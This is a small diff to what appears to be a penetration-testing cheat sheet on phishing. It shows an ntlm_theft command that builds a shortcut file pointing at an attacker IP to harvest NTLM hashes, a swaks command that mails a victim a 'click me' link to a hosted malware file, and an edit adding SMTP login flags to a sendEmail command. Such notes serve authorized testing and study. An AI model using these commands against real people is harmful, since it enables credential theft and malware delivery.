@@ -86,5 +86,5 @@ python ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.191 -f Services
 ```shell
 swaks -t <victim(s)_email> -f <from_email> --server <smtp_server> --body 'click me http://<YOUR_IP>/<MALWARE>' --header "Subject: Important" --add-header "Really: 1.0" --add-header "Content-Type: text/html"  [--attach <ATTACHED_FILE>]
 
-sendEmail -t <victim(s)_email> -u <subject> -m <message> -a <attachment> -s <smtp_server> -f <from_email>
+sendEmail -t <victim(s)_email> -u <subject> -m <message> -a <attachment> -s <smtp_server> -f <from_email> -xu <user> -xp <pass>
 ```
